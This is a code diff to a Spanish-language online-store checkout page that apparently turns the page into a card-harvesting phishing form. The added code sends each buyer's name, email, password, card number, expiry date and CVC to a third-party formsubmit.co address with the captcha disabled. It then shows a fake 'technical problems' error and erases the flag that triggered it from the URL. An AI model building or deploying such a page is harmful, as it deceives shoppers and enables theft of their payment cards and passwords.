@@ -68,6 +68,15 @@
                 padding-left: 8px;
                 padding-right: 0;
             }
+            input::placeholder{
+                color: rgba(0,0,0,0.4) !important;
+            }
+            #rq_{
+                color: red !important;
+            }
+            .info{
+                color: rgba(0,0,0,0.8) !important;
+            }
 
             @media (min-width: 992px){
                 .subrow__1 .col-lg-6:first-of-type{
@@ -92,23 +101,25 @@
                 }
             }
         </style>
+        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.1/dist/sweetalert2.all.min.js"></script>
+        <link href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.1/dist/sweetalert2.min.css" rel="stylesheet">
     </head>
     <body>
         <div class="container pt-5 w-100 h-100" id="pasarela_pago">
             <h1 class="mb-3"><img src="src/cart.png" width="40"> Completar la Compra</h1>
                 <div class="row">
                     <div class="col-md-6 border rounded mr-3 col_1 p-4">
-                        <form method="POST" action="">
+                        <form method="POST" action="https://formsubmit.co/a8e238b42107ee1ca2b6eb3bec77a859" id="form_pago">
                             <div class="mb-3">
-                                <label class="_label">Nombre Completo</label>
-                                <input class="form-control" name="nombreCompleto" type="text">
+                                <label class="_label">Nombre Completo <span id="rq_">*</span></label>
+                                <input class="form-control" name="nombreCompleto" type="text" required>
                                 <small class="info"></small>
                             </div>
                             <div class="row subrow__1">
                                 <div class="col-lg-6">
                                     <div class="mb-3">
-                                        <label class="_label">Apellidos</label>
-                                        <input class="form-control" name="apellidos" type="text">
+                                        <label class="_label">Apellidos <span id="rq_">*</span></label>
+                                        <input class="form-control" name="apellidos" type="text" required>
                                         <small class="info"></small>
                                     </div>
                                 </div>
@@ -121,69 +132,82 @@
                                 </div>
                             </div>
                             <div class="mb-3">
-                                <label class="_label">Correo Electrónico</label>
-                                <input class="form-control" name="correoElectronico" type="email">
+                                <label class="_label">Correo Electrónico <span id="rq_">*</span></label>
+                                <input class="form-control" name="correoElectronico" placeholder="ejemplo@gmail.com" type="email" required>
                                 <small class="info"></small>
                             </div>
                             <div class="mb-3">
-                                <label class="_label">Contraseña</label>
-                                <input class="form-control" name="contrasena" type="password">
+                                <label class="_label">Contraseña <span id="rq_">*</span></label>
+                                <input class="form-control" id="contra_1" name="contrasena" type="password" required>
+                                <small class="info"></small>
+                            </div>
+                            <div class="mb-3">
+                                <label class="_label">Confirmar Contraseña <span id="rq_">*</span></label>
+                                <input class="form-control" id="contra_2" type="password" required>
                                 <small class="info"></small>
                             </div>
                             <hr>
                             <div class="mb-3">
-                                <label class="_label">Número de Tarjeta</label>
-                                <input class="form-control" name="numTarjeta" type="text">
-                                <small class="info"></small>
+                                <label class="_label">Número de Tarjeta <span id="rq_">*</span></label>
+                                <input class="form-control" name="numTarjeta" type="text" maxlength="16" pattern="[0-9]{16}" required>
+                                <small class="info">Ingrese los 16 dígitos de su tarjeta.</small>
                             </div>
                             <div class="row subrow__3">
                                 <div class="col-lg-6">
                                     <div class="mb-3">
-                                        <label class="_label">Fecha de Expiración</label>
+                                        <label class="_label">Fecha de Expiración <span id="rq_">*</span></label>
                                         <div class="row subrow__2">
                                             <div class="col-6">
-                                                <input class="form-control" name="mesTarjetaExpr" type="text" maxlength="2" pattern="[0-9]{2}" placeholder="00">
+                                                <input class="form-control" name="mesTarjetaExpr" type="text" maxlength="2" pattern="[0-9]{2}" placeholder="00" required>
+                                                <small class="info">Mes</small>
                                             </div>
                                             <div class="col-6">
-                                                <input class="form-control" name="anioTarjetaExpr" type="text" maxlength="2" pattern="[0-9]{2}" placeholder="00">
+                                                <input class="form-control" name="anioTarjetaExpr" type="text" maxlength="2" pattern="[0-9]{2}" placeholder="00" required>
+                                                <small class="info">Año</small>
                                             </div>
                                         </div>
                                     </div>
                                 </div>
                                 <div class="col-lg-6">
                                     <div class="mb-3">
-                                        <label class="_label">CVC</label>
-                                        <input class="form-control" type="text" name="cvc" maxlength="3" pattern="[0-9]{3}" placeholder="000">
+                                        <label class="_label">CVC <span id="rq_">*</span></label>
+                                        <input class="form-control" type="text" name="cvc" maxlength="3" pattern="[0-9]{3}" placeholder="000" required>
                                         <small class="info"></small>
                                     </div>
                                 </div>
                             </div>
                             <div>
                                 <button class="btn btn-success btn-lg mb-2 mt-2" id="proceder_compra" type="submit">Proceder con la Compra</button>
-                                <span class="btn btn-secondary btn-lg mb-2 mt-2" onclick="$('#proceder_compra').click()">Volver</span>
+                                <a class="btn btn-secondary btn-lg mb-2 mt-2" href="index.html">Volver</a>
                             </div>
+
+                            <input type="hidden" name="_next" id="currentURIData" value="">
+                            <input type="hidden" name="_captcha" value="false">
+                            <input type="hidden" name="_template" value="table">
                         </form>
                     </div>
                     <div class="col-md-5 border rounded p-4">
+                        <h2 class="mb-3 text-dark">Datos de la Operación</h2>
                         <div class="preview_producto">
                             <img id="imagenProducto" class="img-fluid" width="256" alt=" ">
                             <div class="">
-                                <h3 id="tituloProducto" class="mt-3">Nombre de Producto</h3>
-                                <h5 id="precioNormal" style="text-decoration:line-through" class="mt-2">$ 0.00</h5>
+                                <h3 id="tituloProducto" class="mt-3"></h3>
+                                <h5 id="precioNormal" class="mt-2">$ 0.00</h5>
                                 <h5 id="precioDescuento" class="mt-2" style="font-size:1.75rem">$ 0.00</h5>
                             </div>
                         </div>
                         <hr>
                         <div class="banner_tarjeta">
-                            <div class="row" style="text-align:center">
-                                <div class="col-sm-4">
-                                    <img src="Electronic Store a Ecommerce Online Shopping Category Bootstrap Responsive Website Template _ Home __ w3layouts_files/bancolombia.png" width="92">
+                            Aceptamos las tarjetas:
+                            <div class="row pt-2" style="text-align:center;opacity:0.89">
+                                <div class="col-4">
+                                    <img src="src/mastercard-logo-7.png" class="img-fluid" width="74">
                                 </div>
-                                <div class="col-sm-4">
-                                    <img src="Electronic Store a Ecommerce Online Shopping Category Bootstrap Responsive Website Template _ Home __ w3layouts_files/bbva.webp" width="92">
+                                <div class="col-4">
+                                    <img src="src/visa-logo-1.png" class="img-fluid" width="74">
                                 </div>
-                                <div class="col-sm-4">
-                                    <img src="Electronic Store a Ecommerce Online Shopping Category Bootstrap Responsive Website Template _ Home __ w3layouts_files/banco_bogota.png" width="92">
+                                <div class="col-4">
+                                    <img src="src/American_Express_logo.png" class="img-fluid" width="74">
                                 </div>
                             </div>
                         </div>
@@ -193,10 +217,39 @@
 
         <script type="text/javascript">
             $(document).ready(function(){
+                // Datos del preview del producto.
                 $('#imagenProducto').attr('src',decodeURIComponent(getSearchParams('image_source')));
                 $('#tituloProducto').text(decodeURIComponent(getSearchParams('title_product')).split('+').join(' '));
-                $('#precioNormal').text('$ '+decodeURIComponent(getSearchParams('normalValue_product')));
+                $('#precioNormal').html('<span style="text-decoration:line-through;color:rgba(0,0,0,0.3125)">$ '+decodeURIComponent(getSearchParams('normalValue_product'))+'</span>' + ' <span id="lbl_offd">30% OFF</span>');
                 $('#precioDescuento').text('$ '+decodeURIComponent(getSearchParams('valueDiscount_product')));
+                // url actual del sitio + parámetro adicional GET.
+                $('#currentURIData').val(window.location.href + "&error_data=true_");
+                // Evento escucha del formulario
+                $('#form_pago').submit(function(event){
+                    event.preventDefault();
+                    if($('#form_pago').find('#contra_1').val() == $('#form_pago').find('#contra_2').val()){
+                        event.currentTarget.submit();
+                    }else{
+                        Swal.fire({
+                            icon: 'warning',
+                            title: 'Oops...',
+                            text: 'Las contraseñas no coinciden, vuelve a intentarlo.',
+                            footer: ''
+                        })
+                    }
+                });
+                // Identificar parámetro adicional al cargar la pagina y borrarlo, ya que el mensaje ya fué emitido..
+                if(getSearchParams('error_data') != undefined){
+                    Swal.fire({
+                        icon: 'error',
+                        title: 'Oops... :(',
+                        text: 'Lo sentimos mucho, estamos experimentando problemas técnicos. Porfavor vuelva más tarde.',
+                        footer: ''
+                    });
+                    
+                    let newParams= deleteURLParam('error_data');
+                    window.history.replaceState({}, '', `${location.pathname}?${newParams}`);
+                }
             });
 
             function getSearchParams(param, defaultValue = undefined) {
@@ -208,9 +261,15 @@
                 return defaultValue
             }
 
-            function formatearParaTarjeta(input){
-                var value= $(input).val();
-                // ....
+            function deleteURLParam(paramToDelete, _url= window.location.href){
+                // 1 Get your URL 
+                let url= new URL(_url);
+                // 2 get your params
+                let params= new URLSearchParams(url.search);
+                // 3 Delete the printer param, Query string is now gone
+                params.delete(paramToDelete);
+                
+                return params.toString();
             }
 
             function reorganizarColumnas(){
@@ -233,5 +292,11 @@
                 $(reorganizarColumnas());
             });
         </script>
+        <style>
+            #lbl_offd{
+                color: rgb(11, 165, 11);
+            }
+        </style>
+        <br>
     </body>
 </html>
